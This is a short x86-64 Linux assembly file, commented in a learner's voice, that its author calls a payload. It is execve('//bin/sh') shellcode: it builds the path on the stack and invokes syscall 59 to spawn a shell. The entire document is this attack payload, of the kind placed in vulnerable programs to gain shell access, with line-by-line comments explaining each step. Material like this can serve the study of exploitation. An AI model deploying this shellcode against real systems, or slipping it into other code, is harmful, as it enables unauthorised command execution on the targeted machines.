    ;; This is a better payload which will works only putting the instructions
    section .data
    ;; Now here in data we can't have anything
    section .bss

    section .text
    global _start
    
_start:
    mov rax, 0                  ; so First i put the rax register as zero
    push rax                    ; We need to have zeros
    ;; Here I paste the program name 2F 2F 62 69 6E 2F 73 68
    
    mov rbx, 0x68732f6e69622f2f ; remember that the memory reads backwards
    push rbx                    ; We load in to the memory
    ;;  So inside of the meory we have something like this
    ;; mem = //bin/sh, NULL
    ;; So we can use this things inside of the memory to execute the syscall
    mov rax, 59                 ; the exec code
    mov rdi, rsp                ; The pointer to the program name
    syscall                     ; And yeah thats it 
